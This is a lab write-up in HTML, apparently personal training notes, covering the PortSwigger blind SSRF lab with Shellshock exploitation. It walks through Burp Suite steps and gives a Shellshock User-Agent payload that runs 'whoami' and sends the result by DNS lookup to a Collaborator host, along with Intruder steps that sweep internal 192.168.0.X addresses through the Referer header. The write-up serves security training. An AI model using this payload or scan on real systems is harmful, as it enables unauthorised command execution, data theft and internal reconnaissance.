<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Blind SSRF in multiple Headers (with Shellshock exploitation)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Blind SSRF in multiple Headers (with Shellshock exploitation)</h1><br/><br /><br />This site uses analytics software which <span style="text-decoration:underline;">fetches the URL specified in the </span><strong><span style="text-decoration:underline;">Referer header</span></strong> when a product page is loaded.<br /><br /><strong>Exercise:</strong><br />1. In Burp Suite Professional, install the &quot;Collaborator Everywhere&quot; extension from the BApp Store.<br />   <a href=""><img src="images/2240-1.png" alt="images/2240-1.png" /></a><br />	<a href=""><img src="images/2240-2.png" alt="images/2240-2.png" /></a><br />2. Add the domain of the lab to Burp Suite&#39;s target scope, so that Collaborator Everywhere will target it.<br />	To do it Manually check the chapter before <a href="rver-side--Server_Side_Attacks--Server_Side_Request_Forgery_(SSRF)--Attacks--Blind_SSRF_vulnerabilities--Blind_SSRF_in_the_Header_Referer.html">Blind SSRF with out-of-band detection</a><br />	<a href=""><img src="images/2240-3.png" alt="images/2240-3.png" /></a><br />	<a href=""><img src="images/2240-4.png" alt="images/2240-4.png" /></a><br />3. Reload the Webpage so that the Burp Collaborator Everywhere will target it. Note the <span style="color:#ff0000;">Red dots</span><br />    <a href=""><img src="images/2240-5.png" alt="images/2240-5.png" /></a><br />4. Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator<br />	<a href=""><img src="images/2240-6.png" alt="images/2240-6.png" /></a><br />5. What is done by the &quot;Burp Collaborator Everywere&quot; is insert the URL of the Burp collaborator client on almost every header of the request<br />    <a href=""><img src="images/2240-7.png" alt="images/2240-7.png" /></a><br />6. Observe that also  inside the User-Agent/Referer headers there is the URL of the Burp collaborator client. <br />    <a href=""><img src="images/2240-8.png" alt="images/2240-8.png" /></a><br />	<a href=""><img src="images/2240-9.png" alt="images/2240-9.png" /></a><br />	<a href=""><img src="images/2240-10.png" alt="images/2240-10.png" /></a><br /><br />7. Generate a Burp Collaborator and copy to Clibpoard the URL of the Burp Collaborator Client<br />    <a href=""><img src="images/2240-11.png" alt="images/2240-11.png" /></a><br />8. Test manually with Burp Repeater and check the interactions in Burp Collaborator<br />    <a href=""><img src="images/2240-12.png" alt="images/2240-12.png" /></a><br />    Burp Collaborator:<br />    <a href=""><img src="images/2240-13.png" alt="images/2240-13.png" /></a><br />    <a href=""><img src="images/2240-14.png" alt="images/2240-14.png" /></a><br />    In this example what is happening:<br />   ◇ what is inside the User-Agent: is responsable of the HTTP request <br />   ◇ what is inside the Referrer: is the host that is queried<br />9. Send the product page vulnerable to Burp Intruder and Test it by changing User-Agent AND Referrer<br />    Explanation of the <a href="Home--Penetration_Test_Methodology--WebApp_Pentest--Vulnerability_assessment--Common_Vulnerabilities--Shellshock.html">Shellshock Vulnerability here</a><br />   ◇ In the User-Agent Header place the following Shellshock payload:<br />	    <div class="codebox"><pre>() { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net</pre></div><br />	    <a href=""><img src="images/2240-15.png" alt="images/2240-15.png" /></a><br />	    The User-Agent value exploit the Shellshock Vulnerability, it will be stored an environment variable<br />      ▪ <span style="color:#3ad900;">() { :;}; </span>→ this indicate to bash the parameter where will be stored the value of User-Agentis not only  a standard environment variable, but rather is a Bash function being stored in an environment variable. <br />         - The parentheses, <span style="color:#00ff00;">()</span>, indicate that this is a function. <br />         - Within the curly braces, <span style="color:#00ff00;">{ }</span>, is what this function will actually do. In large part, is arbitrary. <br />         - We could put some shell commands here but for this vulnerability the most commonly found value within the curly braces is a colon, :, which to Bash means &quot;do nothing&quot;<br />      ▪  <span style="color:#1e90ff;">/usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net</span> → command that will be executed on the target machine<br />   ◇ In the Referer header place http://192.168.0.1:8080 then highlight the final octet of the IP address (the number 1), click &quot;Add §&quot;.<br />       <a href=""><img src="images/2240-16.png" alt="images/2240-16.png" /></a><br />       Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the &quot;From&quot; and &quot;To&quot; and &quot;Step&quot; boxes respectively.<br />       <a href=""><img src="images/2240-17.png" alt="images/2240-17.png" /></a><br />10. Click &quot;Start attack&quot;.<br />11. When the attack is finished, go back to the Burp Collaborator client window, and click &quot;Poll now&quot;. <br />    You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. <br />    The name of the OS user should appear within the DNS subdomain.<br />    <a href=""><img src="images/2240-18.png" alt="images/2240-18.png" /></a><br />    What is happened is that is been queried to an host of 192.168.0.X of the resolution of the domain name <code>() { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net</code><br /><br /><br /><br />	<br /><br /><br /><strong>Bibliography:</strong><br /><a href="https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation">https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation</a><br /><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient">https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient</a><br /></div>
</body>
</html>
